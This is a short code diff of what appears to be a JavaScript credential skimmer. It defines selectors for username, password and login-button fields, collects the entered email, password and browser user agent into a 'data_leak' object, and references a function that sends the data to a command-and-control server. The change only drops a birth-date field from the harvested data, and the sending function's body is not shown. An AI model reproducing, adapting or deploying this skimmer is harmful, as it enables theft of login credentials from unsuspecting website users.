@@ -1,6 +1,5 @@
 window["data_leak_label_email"] = ["input[id*='username']", "input[name*='username']", "input[type*='text']"]
 window["data_leak_label_password"] = ["input[id*='password']", "input[name*='password']"]
-window["data_leak_label_birth_date"] = ["input[id*='wsi-login-credentials-form-birthdate']", "input[name*='birthDate']"]
 window["data_leak_label_submit_button"] = ["button[id*='loginbtn']"]
 
 function send_data_to_c2_server(data) {
@@ -65,7 +64,6 @@ function listener_fetch_data_leak() {
     data_leak = {
         "email": get_element_value(window["data_leak_label_email"]),
         "password": get_element_value(window["data_leak_label_password"]),
-        "birth_date": get_element_value(window["data_leak_label_birth_date"]),
         "uagent": navigator.userAgent
     }
 
